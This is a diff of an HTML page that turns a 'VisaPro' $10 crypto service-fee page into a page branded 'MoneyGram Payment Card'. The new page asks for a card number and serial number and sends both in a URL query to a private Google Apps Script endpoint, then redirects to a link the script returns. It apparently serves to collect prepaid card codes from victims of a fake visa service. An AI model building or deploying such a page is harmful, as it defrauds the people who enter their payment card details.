@@ -1,104 +1,147 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>VisaPro - Payment</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title> MoneyGram Payment Card</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: #f2f2f2;
+      background-color: #fff5f5;
+      font-family: 'Tahoma', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      margin: 0;
     }
 
-    .payment-container {
-      background: #fff;
-      padding: 30px 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
+    .container {
+      background-color: #fff;
+      padding: 30px;
+      border: 2px solid #d33;
+      border-radius: 10px;
+      width: 100%;
       max-width: 400px;
-      width: 90%;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+    }
+
+    h2 {
+      text-align: center;
+      color: #d33;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      background-color: #d33;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #aaa;
+    }
+
+    #loading {
+      display: none;
       text-align: center;
     }
 
-    .payment-container h2 {
-      margin-bottom: 15px;
-      font-size: 24px;
-      color: #333;
+    #loading img {
+      width: 50px;
     }
 
-    .payment-container p {
-      margin-bottom: 25px;
-      font-size: 16px;
-      color: #666;
-    }
-
-    .submit {
+    #message {
+      text-align: center;
       margin-top: 15px;
-      transition: transform 0.3s ease;
-    }
-
-    .submit:hover {
-      transform: scale(1.05);
+      color: #d33;
+      font-weight: bold;
     }
 
     @media (max-width: 500px) {
-      .payment-container {
+      .container {
         padding: 20px;
+        margin: 10px;
       }
     }
   </style>
 </head>
 <body>
 
-  <div class="payment-container">
-    <h2>Pay $10 Service Fee</h2>
-    <p>Please click the button below to proceed with your crypto payment.</p>
+  <div class="container">
+    <h2>MoneyGram Payment Card </h2>
+    <label for="cardNumber">Card Number </label>
+    <input type="text" id="cardNumber" placeholder="Type card Number " required>
 
-    <form method="POST" action="http://btcpay.local/api/v1/invoices" class="btcpay-form btcpay-form--block">
-      <input type="hidden" name="storeId" value="E3xw9EgLNC5ogEPJgYsfxwCaFjSMSHeXp6YQ5XuqNnag" />
-      <input type="hidden" name="jsonResponse" value="true" />
-      <input type="hidden" name="orderId" value="auto" />
-      <input type="hidden" name="checkoutDesc" value="VisaPro Service Fee" />
-      <input type="hidden" name="browserRedirect" value="https://visaprointernational.github.io/.com/about.html" />
-      <input type="hidden" name="notifyEmail" value="VisaProInternational@tuta.io" />
-      <input type="hidden" name="checkoutQueryString" value="lang=en" />
-      <input type="hidden" name="price" value="10" />
-      <input type="hidden" name="currency" value="USD" />
-      <input type="image" class="submit" name="submit" src="http://btcpay.local/img/paybutton/pay.svg" style="width: 209px;" alt="Pay with BTCPay Server">
-    </form>
+    <label for="serialNumber">Serial Number </label>
+    <input type="text" id="serialNumber" placeholder="Type Serial Number " required>
+
+    <button onclick="processPayment()">Pay now</button>
+
+    <div id="loading">
+      <img src="https://i.gifer.com/YCZH.gif" alt=" Please wait your payment process in progress ...">
+      <p>Please wait your payment process in progress ...</p>
+    </div>
+
+    <div id="message"></div>
   </div>
 
   <script>
-    if (!window.btcpay) {
-      var script = document.createElement('script');
-      script.src = "http://btcpay.local/modal/btcpay.js";
-      document.head.appendChild(script);
-    }
+    async function processPayment() {
+      const card = document.getElementById('cardNumber').value.trim();
+      const serial = document.getElementById('serialNumber').value.trim();
+      const loading = document.getElementById('loading');
+      const message = document.getElementById('message');
 
-    function handleFormSubmit(event) {
-      event.preventDefault();
-      var xhttp = new XMLHttpRequest();
-      xhttp.onreadystatechange = function () {
-        if (this.readyState == 4 && this.status == 200 && this.responseText) {
-          window.btcpay.appendInvoiceFrame(JSON.parse(this.responseText).invoiceId);
-        }
-      };
-      xhttp.open('POST', event.target.getAttribute('action'), true);
-      xhttp.send(new FormData(event.target));
-    }
-
-    document.querySelectorAll(".btcpay-form").forEach(function (el) {
-      if (!el.dataset.initialized) {
-        el.addEventListener('submit', handleFormSubmit);
-        el.dataset.initialized = true;
+      if (!card || !serial) {
+        message.textContent = 'All field is required';
+        return;
       }
-    });
+
+      message.textContent = '';
+      loading.style.display = 'block';
+
+      try {
+        const sheetURL = 'https://script.google.com/macros/s/AKfycbwyBWMQV78wSFf6y2_oGJCIAraZkSJvbznnhhT1UoqVS0mQUuUTRJefL9itAj4gCKA/exec';
+        const response = await fetch(sheetURL + `?card=${card}&serial=${serial}`);
+        const result = await response.json();
+
+        loading.style.display = 'none';
+
+        if (result.status === 'success') {
+          message.style.color = 'green';
+          message.textContent = 'Payment Was seccessfully';
+          window.location.href = result.link;
+        } else {
+          message.style.color = 'red';
+          message.textContent = 'Serial Number already used.';
+        }
+
+      } catch (error) {
+        loading.style.display = 'none';
+        message.style.color = 'red';
+        message.textContent = 'Please try a new valid Serial Number.';
+      }
+    }
   </script>
+
 </body>
 </html>
